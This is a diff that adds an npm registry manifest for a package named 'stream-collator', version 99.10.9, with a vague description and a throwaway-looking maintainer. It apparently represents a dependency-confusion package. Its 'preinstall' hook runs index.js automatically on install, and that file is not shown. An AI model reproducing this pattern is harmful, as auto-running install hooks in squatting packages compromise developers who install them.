@@ -1,0 +1,39 @@
+{
+    "name": "stream-collator",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "stream-collator@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-uOzg+jIuyD1qea2AEXXjA1oPfMNujAjtV+ie1DZK+gaez5pjxmZldtnhyiiMam1zKxJnFDzz0zGqt9juoz/hDA==",
+        "shasum": "7841e2d0aa1d122351ae83330a8fcb42cf60b351",
+        "tarball": "https://registry.npmjs.org/stream-collator/-/stream-collator-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5067,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPM06ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmovMQ/+JRLXaXAaf6kqi4FGShX5aTi22D1rP6L7VOUnmgQzSoCSahwX\r\nhFMyyMqFUloyVt+ICibaRJHdh8zwp7SSe23NhZS0RNVkPJxZVRYNtQvq8WtL\r\nEZHDKiWGZ9XHOCB8qDYuIoWdp5OMozQbvo3Bh2OlwDh78Ikx2sA4HAYbqsoa\r\nQrW6UwMEZqp/TLYMiIfAAGaUtyvieJvqrilL+dGYKAkGacnBqah0ED4ymdnX\r\nJXwXbLhyd9XNO0uemOepdDnfbz+UHh1o5lDuiSzNpvMi2fvFxaNlmm9al/pS\r\n9SnUP4avIqIg0LX2j8nEVv7f8MW5cjHmD9oLAQ5IEEnJ8LNod7An6QCqscqG\r\nWK2y28ap2gkk+iRbBVGn2A5oBeNqKEHeBmLJH+13JrRXQbS30PFgjRNsz8SC\r\n7wMuAS3+ABuKjNIMxixDQLdPshVvBD/Ur+mgHQN8g/Qu//La8OCoEYAHV0eO\r\nrqdDRWgYWEg9Jzn8gfxWQRMY2zDG+6Y6yiO07VSVO4W/NyJPf2ua0KGmHg6N\r\nlPUR1RX807HaouevO+04eVz0d8HK0+lgibH0doGa+3WzhNWfT7sU2FHuaMjB\r\nvc2YdCRA2/n2XbkNV9zRNCOF0FHYEXlbX8KSNybKtTj3sBBohS/kHV1VW2Yq\r\n5XxoylsJkwTP3d6IvqBLgEJZftUaRYFcMUg=\r\n=rsCo\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "7ktti385",
+        "email": "7ktti385@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "7ktti385",
+            "email": "7ktti385@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/stream-collator_99.10.9_1648151866728_0.4144901353903281"
+    },
+    "_hasShrinkwrap": false
+}
